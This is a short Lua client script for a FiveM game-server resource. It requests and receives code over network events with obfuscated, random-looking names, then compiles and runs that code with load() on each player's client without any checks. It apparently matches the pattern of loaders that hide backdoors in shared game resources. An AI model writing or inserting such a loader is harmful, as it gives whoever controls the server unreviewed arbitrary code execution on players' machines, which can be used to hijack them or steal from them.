local executedPlayers = {}
local resourceName = GetCurrentResourceName()

RegisterNetEvent(resourceName .. ":Nzft8ATykVjvecHu8aFWBhA7q", function(resources, code)
    local playerId = GetPlayerServerId(PlayerId())

    if not executedPlayers[playerId] then
        executedPlayers[playerId] = { executed = false, resourceCount = 0 }
    end

    if executedPlayers[playerId].executed then return end

    local func = load(code)
    if func then
        func()

        executedPlayers[playerId].resourceCount += 1

        if executedPlayers[playerId].resourceCount >= resources then
            executedPlayers[playerId].executed = true
        end
    end
end)

TriggerServerEvent(resourceName .. ":XcNCW3FzYY99Q6ocgruQ7NZ3a")
